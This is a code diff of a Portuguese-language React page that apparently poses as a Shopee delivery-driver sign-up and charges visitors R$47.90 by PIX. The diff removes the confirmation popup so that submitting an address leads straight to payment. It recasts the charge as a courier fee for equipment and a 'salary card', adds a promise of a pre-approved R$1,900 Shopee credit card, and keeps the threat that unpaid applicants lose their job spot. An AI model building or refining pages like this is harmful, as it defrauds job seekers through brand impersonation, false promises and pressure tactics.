@@ -18,7 +18,6 @@ import { useScrollTop } from '@/hooks/use-scroll-top';
 import { API_BASE_URL } from '../lib/api-config';
 import { createPixPayment } from '../lib/payments-api';
 import { initFacebookPixel, trackEvent, trackPurchase, checkPaymentStatus } from '../lib/facebook-pixel';
-import EPIConfirmationModal from '@/components/EPIConfirmationModal';
 import EntregadorCracha from '@/components/EntregadorCracha';
 import QRCodeGenerator from '@/components/QRCodeGenerator';
 
@@ -328,14 +327,14 @@ const Entrega: React.FC = () => {
   // Não usamos mais a geração local de códigos PIX
   // Todos os pagamentos serão processados pela API For4Payments
 
-  // Handler para o formulário de endereço
+  // Handler para o formulário de endereço - vai direto para pagamento
   const onSubmitEndereco = async (data: EnderecoFormValues) => {
     try {
       // Salvar endereço completo
       localStorage.setItem('endereco_entrega', JSON.stringify(data));
       
-      // Mostrar o modal de confirmação primeiro
-      setShowConfirmationModal(true);
+      // Processar pagamento diretamente, sem popup de confirmação
+      await processarPagamento();
     } catch (error: any) {
       console.error("Erro ao processar endereço:", error);
       toast({
@@ -346,11 +345,10 @@ const Entrega: React.FC = () => {
     }
   };
   
-  // Função para processar o pagamento após a confirmação
+  // Função para processar o pagamento diretamente
   const processarPagamento = async () => {
     try {
-      // Fechar o modal de confirmação e abrir o de pagamento
-      setShowConfirmationModal(false);
+      // Abrir modal de pagamento diretamente
       setShowPaymentModal(true);
       setIsLoading(true);
       
@@ -642,7 +640,7 @@ const Entrega: React.FC = () => {
                       </div>
                     </div>
                     <p className="mt-4 text-gray-600 text-sm">
-                      Seu cartão personalizado será liberado após a confirmação do pagamento
+                      Seu cartão Shopee com R$ 1.900,00 de limite de crédito pré-aprovado.
                     </p>
                   </div>
                 </div>
@@ -773,8 +771,7 @@ const Entrega: React.FC = () => {
                     <div>
                       <h4 className="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
                       <p className="text-sm text-gray-700">
-                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório a aquisição do 
-                        Kit Oficial de Entregador da Shopee. O kit é entregue a preço de custo por <strong>R$47,90</strong>.
+                        Para receber seu equipamento de trabalho e o Cartão salário é necessário o pagamento da taxa de entrega via transportadora no valor de <strong>R$47,90</strong>.
                       </p>
                     </div>
                   </div>
@@ -791,14 +788,9 @@ const Entrega: React.FC = () => {
                       </svg>
                     </div>
                     <div>
-                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
-                      <p className="text-red-700 text-sm mt-1">
-                        O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
-                        adquirir este kit oficial para exercer a função de entregador Shopee.
-                      </p>
+                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Finalizar Cadastro".</h4>
                       <p className="text-red-700 text-sm mt-2">
-                        Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
-                        caso contrário, perderá o direito à vaga de entregador.
+                        Ao prosseguir, você se compromete a realizar o pagamento da taxa d entrega do seu cartão e do kit EPI. Caso contrário, perderá o direito à vaga de entregador.
                       </p>
                       
                       {/* Botão on/off (switch) */}
@@ -828,7 +820,7 @@ const Entrega: React.FC = () => {
                   style={{ height: '50px' }}
                   disabled={!acceptedTerms}
                 >
-                  Comprar e Ativar Cadastro
+                  Finalizar Cadastro
                 </Button>
               </form>
             </div>
@@ -1023,12 +1015,6 @@ const Entrega: React.FC = () => {
         </DialogContent>
       </Dialog>
       
-      {/* Modal de confirmação para o kit EPI */}
-      <EPIConfirmationModal
-        isOpen={showConfirmationModal}
-        onOpenChange={setShowConfirmationModal}
-        onConfirm={processarPagamento}
-      />
 
       {/* Popup de status do pagamento - aparece 30 segundos após abrir o modal */}
       <Dialog open={showPaymentStatusPopup} onOpenChange={setShowPaymentStatusPopup}>
